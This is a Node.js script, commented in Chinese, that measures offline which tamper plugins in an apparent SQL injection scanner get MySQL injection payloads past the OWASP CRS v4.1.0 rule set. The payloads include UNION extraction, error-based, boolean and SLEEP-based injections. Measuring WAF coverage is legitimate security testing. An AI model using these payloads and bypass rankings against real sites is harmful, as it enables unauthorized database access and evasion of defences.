// 全量 tamper 插件对 CRS v4.1.0 的静态绕过率扫描（不发包）
// 目的：用数据回答「哪些 tamper 对 CRS PL1 有效」，而不是凭经验猜。
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { evaluate } from './crs-engine.js';
const require = createRequire(new URL('../../server/package.json', import.meta.url));
const here = dirname(fileURLToPath(import.meta.url));
const { applyTampers } = require(resolve(here, '../../server/src/core/tamper/applyTampers.js'));
const { tamperRegistry } = require(resolve(here, '../../server/src/core/tamper/TamperRegistry.js'));

const SAMPLES = [
  "1' UNION SELECT NULL,CONCAT('__S__',CAST((version()) AS CHAR),'__E__'),NULL,NULL-- -",
  "1' AND 1=1-- -",
  "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
  "1 AND SLEEP(5)-- -",
  "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
  "keyboard%' AND 1=1-- -",
  // UNION 列探测（引擎真实形态，带 SQLISCANNER<N> 标记）——CRS 942511/942200 以「引号」为锚点
  "1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1'",
  "1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3'",
];

const ctx = { dbms: 'MySQL', config: {} };
const names = tamperRegistry.list().map((p) => (typeof p === 'string' ? p : p.name)).sort();

function score(chain) {
  let pass = 0;
  const rules = [];
  for (const p of SAMPLES) {
    const t = chain ? applyTampers(p, ctx, chain) : p;
    const r = evaluate({ uri: '/num?id=1', queryString: `id=${encodeURIComponent(t)}`, args: { id: t }, cookies: {}, headers: {} });
    if (!r.blocked) pass++;
    else rules.push(r.ruleId || '?');
  }
  return { pass, rules };
}

const rows = [];
rows.push({ label: '(off) 不做变形', ...score(null) });
for (const n of names) {
  try {
    rows.push({ label: n, ...score([n]) });
  } catch (e) {
    rows.push({ label: n, pass: -1, rules: [`ERR:${e.message}`] });
  }
}

rows.sort((a, b) => b.pass - a.pass || a.label.localeCompare(b.label));
console.log(`插件总数 ${names.length}，样本 ${SAMPLES.length} 条`);
console.log('绕过数 | 插件');
for (const r of rows) {
  const flag = r.pass > 0 ? '  ★' : '   ';
  console.log(`${flag} ${String(r.pass).padStart(2)}/${SAMPLES.length}  ${r.label}${r.rules.length ? '  命中:' + [...new Set(r.rules)].join(',') : ''}`);
}
const winners = rows.filter((r) => r.pass > 0).map((r) => r.label);
console.log('\n有绕过效果的插件：', winners.length ? winners.join(', ') : '（无）');
process.exit(0);
